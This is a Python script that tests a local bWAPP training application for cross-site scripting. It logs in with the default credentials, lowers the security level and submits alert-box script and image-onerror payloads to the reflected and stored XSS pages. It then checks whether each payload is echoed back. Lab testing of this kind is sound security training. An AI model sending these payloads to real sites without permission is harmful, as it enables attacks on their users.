import requests

# bWAPP URL and credentials
bwapp_url = "http://localhost/bWAPP"
login_url = f"{bwapp_url}/login.php"
security_url = f"{bwapp_url}/security_level_set.php"
reflected_xss_urls = [
    f"{bwapp_url}/xss_get.php",   # The first reflected XSS test uses GET
    f"{bwapp_url}/xss_post.php"   # The second reflected XSS test uses POST
]
stored_xss_url = f"{bwapp_url}/xss_stored_1.php"  # Correct stored XSS page (Blog)
username = "bee"  # default bWAPP username
password = "bug"  # default bWAPP password

# Start a session
session = requests.Session()

# Log in to bWAPP
login_data = {
    "login": username,
    "password": password,
    "form": "submit"
}
response = session.post(login_url, data=login_data)

# Check if login was successful
if "Welcome" in response.text:
    print("Login successful.")
else:
    print("Login failed.")
    exit()

# Set security level to low
security_data = {
    "security_level": "0",  # 0 for low
    "form": "submit"
}
response = session.post(security_url, data=security_data)

# Confirm the security level was set
response = session.get(security_url)
if "low" in response.text:
    print("Security level confirmed as low.")
else:
    print("Failed to set security level to low.")
    exit()

# Function to print vulnerability information
def print_vulnerability(vuln_type, param, payload, category):
    print(f"Vulnerability Type: {vuln_type}")
    print(f"Vulnerable Parameter: {param}")
    print(f"Payload: {payload}")
    print(f"Category: {category}")
    print("-" * 80)

# Reflected XSS Tests
reflected_xss_payloads = [
    ("firstname", "<script>alert('XSS1')</script>"),
    ("firstname", "<img src='x' onerror='alert(\"XSS2\")'>")
]

# First reflected XSS test using GET
response = session.get(reflected_xss_urls[0], params={
    reflected_xss_payloads[0][0]: reflected_xss_payloads[0][1],
    "lastname": "Doe"
})

if reflected_xss_payloads[0][1] in response.text:
    print_vulnerability("Reflected XSS", reflected_xss_payloads[0][0], reflected_xss_payloads[0][1], "Detected via response content")
else:
    print("No vulnerability detected in Reflected XSS Test 1.")

# Second reflected XSS test using POST
response = session.post(reflected_xss_urls[1], data={
    reflected_xss_payloads[1][0]: reflected_xss_payloads[1][1],
    "lastname": "Doe"
})

if reflected_xss_payloads[1][1] in response.text:
    print_vulnerability("Reflected XSS", reflected_xss_payloads[1][0], reflected_xss_payloads[1][1], "Detected via response content")
else:
    print("No vulnerability detected in Reflected XSS Test 2.")

# Stored XSS Test (Blog)
stored_xss_payload = "<script>alert('XSS3')</script>"
stored_xss_data = {
    "entry": stored_xss_payload,  # The text area name in the form
    "entry_add": "on",  # Ensuring the 'Add' action is triggered
    "blog": "submit"  # The submit button name
}
response = session.post(stored_xss_url, data=stored_xss_data)

# Retrieve the blog page to see if the payload is stored and reflected
response = session.get(stored_xss_url)
if stored_xss_payload in response.text:
    print_vulnerability("Stored XSS", "entry", stored_xss_payload, "Detected via response content")
else:
    print("No vulnerability detected in Stored XSS Test.")
